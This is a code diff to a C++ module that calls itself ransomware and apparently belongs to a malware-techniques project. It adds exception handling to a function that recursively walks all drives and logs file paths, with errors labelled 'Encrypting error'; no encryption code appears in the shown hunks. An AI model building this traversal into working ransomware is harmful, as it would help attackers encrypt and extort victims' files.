@@ -1,12 +1,15 @@
-#include "ransomware.h"
-#include "../MalwareTechniques/ntdll.h"
 #include "../Logger/logger.h"
+#include "../MalwareTechniques/ntdll.h"
+#include "ransomware.h"
 
+#include <exception>
 #include <iostream>
+#include <stdexcept>
+#include <string>
 #include <string_view>
 
 #include <Windows.h>
-#include <string>
+
 
 namespace maltech {
 
@@ -28,7 +31,12 @@ namespace maltech {
                     std::string path;
                     path += disk;
                     path += ":\\*";
-                    PrintCatalogue(path);
+                    try {
+                        PrintCatalogue(path);
+                    }
+                    catch (const std::exception& e) {
+                        LOG_ERROR("Encrypting error: "s + e.what());
+                    }
                 }
             }
         }
@@ -37,8 +45,10 @@ namespace maltech {
             WIN32_FIND_DATA data{ 0 };
             HANDLE hDirEntry = FindFirstFileA(path.data(), &data);
             if (!hDirEntry || hDirEntry == INVALID_HANDLE_VALUE) {
-                LOG_ERROR(std::to_string(GetLastError()));
-                return;
+                throw std::runtime_error("Can't open " 
+                    + std::string(path)
+                    + ". Error code: " 
+                    + std::to_string(GetLastError()));
             }
 
             do {
@@ -49,9 +59,14 @@ namespace maltech {
                 }
                 LOG_INFO(std::string(path.substr(0, path.size() - 1)) + data.cFileName);
                 if (data.dwFileAttributes == FILE_ATTRIBUTE_DIRECTORY) {
-                    PrintCatalogue(
-                        std::string(path.substr(0, path.size() - 1))
-                        + data.cFileName + "\\*");
+                    try {
+                        PrintCatalogue(
+                            std::string(path.substr(0, path.size() - 1))
+                            + data.cFileName + "\\*");
+                    }
+                    catch (const std::exception& e) {
+                        LOG_ERROR("Encrypting error: "s + e.what());
+                    }
                 }
             } while (FindNextFileA(hDirEntry, &data));
             FindClose(hDirEntry);
